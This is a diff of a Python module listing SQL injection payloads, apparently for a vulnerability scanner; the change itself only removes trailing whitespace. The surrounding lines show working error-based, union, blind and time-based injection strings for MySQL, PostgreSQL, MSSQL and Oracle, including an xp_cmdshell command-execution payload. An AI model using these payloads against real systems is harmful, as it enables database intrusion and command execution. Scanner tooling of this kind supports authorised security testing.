@@ -5,7 +5,7 @@ Includes various types of SQL injection payloads for different databases
 
 class SQLPayloads:
     """Collection of SQL injection payloads"""
-    
+
     # Error-based SQL Injection payloads
     ERROR_BASED = [
         "'",
@@ -30,7 +30,7 @@ class SQLPayloads:
         "') or ('1'='1--",
         "') or ('1'='1#",
     ]
-    
+
     # Union-based SQL Injection payloads
     UNION_BASED = [
         "' UNION SELECT NULL--",
@@ -54,7 +54,7 @@ class SQLPayloads:
         "1' ORDER BY 5--",
         "1' ORDER BY 10--",
     ]
-    
+
     # Boolean-based blind SQL Injection payloads
     BOOLEAN_BASED = [
         "' AND '1'='1",
@@ -74,7 +74,7 @@ class SQLPayloads:
         "' AND LENGTH(database())>0--",
         "' AND LENGTH(database())>100--",
     ]
-    
+
     # Time-based blind SQL Injection payloads
     TIME_BASED = [
         "'; WAITFOR DELAY '0:0:5'--",
@@ -91,7 +91,7 @@ class SQLPayloads:
         "'; SELECT pg_sleep(5)--",
         "' AND pg_sleep(5)--",
     ]
-    
+
     # SQL Injection for different databases
     MYSQL_SPECIFIC = [
         "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
@@ -100,26 +100,26 @@ class SQLPayloads:
         "' UNION SELECT user(),database(),version()--",
         "' OR '1'='1' LIMIT 1--",
     ]
-    
+
     POSTGRESQL_SPECIFIC = [
         "'; SELECT pg_sleep(5)--",
         "' AND 1=CAST((SELECT version()) AS int)--",
         "' UNION SELECT NULL,version(),NULL--",
     ]
-    
+
     MSSQL_SPECIFIC = [
         "'; WAITFOR DELAY '0:0:5'--",
         "' AND 1=CONVERT(int,@@version)--",
         "' UNION SELECT NULL,@@version,NULL--",
         "'; EXEC xp_cmdshell('whoami')--",
     ]
-    
+
     ORACLE_SPECIFIC = [
         "' UNION SELECT NULL,banner FROM v$version--",
         "' AND 1=UTL_INADDR.GET_HOST_ADDRESS('x')--",
         "' || (SELECT banner FROM v$version WHERE rownum=1)--",
     ]
-    
+
     # Common SQL error signatures for detection
     ERROR_SIGNATURES = [
         "SQL syntax",
@@ -148,7 +148,7 @@ class SQLPayloads:
         "Access Database Engine",
         "Microsoft Access Driver",
     ]
-    
+
     @classmethod
     def get_all_payloads(cls):
         """Get all SQL injection payloads"""
@@ -162,7 +162,7 @@ class SQLPayloads:
             cls.MSSQL_SPECIFIC +
             cls.ORACLE_SPECIFIC
         )
-    
+
     @classmethod
     def get_basic_payloads(cls):
         """Get basic/common SQL injection payloads for quick scan"""
